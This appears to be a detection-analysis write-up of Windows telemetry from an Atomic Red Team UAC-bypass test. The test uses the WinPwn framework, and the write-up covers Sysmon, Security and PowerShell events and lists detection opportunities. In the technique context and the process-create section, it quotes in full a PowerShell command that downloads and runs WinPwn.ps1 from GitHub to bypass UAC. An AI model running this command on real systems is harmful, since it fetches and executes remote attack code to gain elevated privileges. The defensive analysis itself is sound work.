# T1548.002-18: Bypass User Account Control — WinPwn UAC Magic

## Technique Context

This test uses the WinPwn PowerShell framework (by S3cur3Th1sSh1t) to perform a UAC bypass
via the "magic" technique. WinPwn's `UACBypass -technique magic` downloads and executes
the WinPwn.ps1 module from GitHub, then applies a UAC bypass approach based on the
`CompMgmtLauncher.exe` or related auto-elevating binary's environment variable lookup.
The test command line is:
`iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')`
`UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique magic`

This is a live internet fetch — the WinPwn script is downloaded from raw.githubusercontent.com
at test execution time, which is directly observable in network telemetry.

## What This Dataset Contains

**Sysmon (31 events):** EIDs 7 (ImageLoad, 17), 1 (ProcessCreate, 3), 10 (ProcessAccess, 3),
3 (NetworkConnect, 3), 17 (PipeCreate, 2), 11 (FileCreate, 2), 22 (DnsQuery, 1).

Key process-create events (EID 1):
- `whoami.exe` — ART pre-check
- Child `powershell.exe` with the full WinPwn download-and-execute command:
  `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')`
  `UACBypass -noninteractive -command ""C:\windows\system32\cmd.exe"" -technique magic}`
  `MD5=9D8E30DAF21108092D5980C931876B7E, SHA256=3247BCFD60F6DD25F34CB74B5889AB10EF1B3EC72B4D4B3D95B5B25B534560B8`
- Second `whoami.exe` — post-check

EID 3 (NetworkConnect) — three connections from the WinPwn `powershell.exe` process to
`185.199.109.133:443` (GitHub raw content CDN), `SourceIp: 192.168.4.16`, protocol TCP,
tagged `technique_id=T1059.001`. This is the WinPwn script download and the subsequent
GitHub CDN TLS negotiation.

EID 11 — `powershell.exe` creating
`C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive` — ambient PowerShell profile initialization artifact.

**Security (4 events):** Four EID 4688 events: `whoami.exe` (pre-check), the WinPwn
`powershell.exe` child, second `whoami.exe` (post-check), and a fourth process creation
in the test window. All `TokenElevationTypeDefault (1)`.

**PowerShell (112 events):** EIDs 4104 (109), 4103 (2), 4100 (1). The two EID 4103 events
are `Set-ExecutionPolicy -Bypass` (ART test framework) and a second module invocation. The EID 4100
event indicates a pipeline error during execution. The 109 EID 4104 events include the full
WinPwn script-block content as it was compiled and executed in memory — substantially richer
than the defended run's 51 events.

## What This Dataset Does Not Contain

**No DNS query for raw.githubusercontent.com in the sample window.** Although three EID 3
network connection events to `185.199.109.133:443` are present, EID 22 (DNS query) for
`raw.githubusercontent.com` is not in the samples for this test (it may have resolved from
a prior test's DNS cache). The network connections confirm the download occurred regardless.

**No elevated cmd.exe spawned by the bypass.** WinPwn's "magic" technique should result in a
`cmd.exe` running at high integrity — but this elevated child does not appear in the Security
or Sysmon samples. The bypass ran and the download completed (network events confirm this),
but the elevated payload process was not captured in the sample window.

**No technique-specific registry artifacts.** WinPwn's magic technique may involve registry
key writes, but no Sysmon EID 12/13 events for attack-related registry paths appear here.

## Assessment

This dataset stands out from the UACME method tests (12–15) by introducing genuine network
telemetry: three Sysmon EID 3 events confirming an outbound HTTPS connection to GitHub's CDN
at `185.199.109.133:443`. In any real-world scenario, an outbound connection from `powershell.exe`
to raw.githubusercontent.com immediately followed by `UACBypass` in the command line is a
high-fidelity indicator. The PowerShell channel expands to 112 events (vs. 51 defended) because
the full WinPwn script is now logged without AMSI interference. The MD5/SHA256 of the WinPwn
`powershell.exe` child process
(`SHA256=3247BCFD60F6DD25F34CB74B5889AB10EF1B3EC72B4D4B3D95B5B25B534560B8`) appears across
all WinPwn-based tests (18, 19, 20) and could serve as a process binary hash indicator.

## Detection Opportunities Present in This Data

- **Security EID 4688 / Sysmon EID 1:** `powershell.exe` with `iex` + `downloadstring` +
  `WinPwn.ps1` URL + `UACBypass` in the command line.
- **Sysmon EID 3:** `powershell.exe` making outbound HTTPS connections to `185.199.109.133`
  (GitHub CDN) immediately before or after a UAC bypass command is a strong behavioral indicator.
- **Sysmon EID 22:** DNS query for `raw.githubusercontent.com` from `powershell.exe` at
  `NT AUTHORITY\SYSTEM` is anomalous in most environments.
- **PowerShell EID 4104:** Script-block text containing both the WinPwn GitHub URL and
  `UACBypass -technique magic` in the same runspace.
- **Process hash:** `SHA256=3247BCFD60F6DD25F34CB74B5889AB10EF1B3EC72B4D4B3D95B5B25B534560B8`
  for the WinPwn `powershell.exe` child process appears across Methods 18, 19, 20, and 21 in
  this batch.
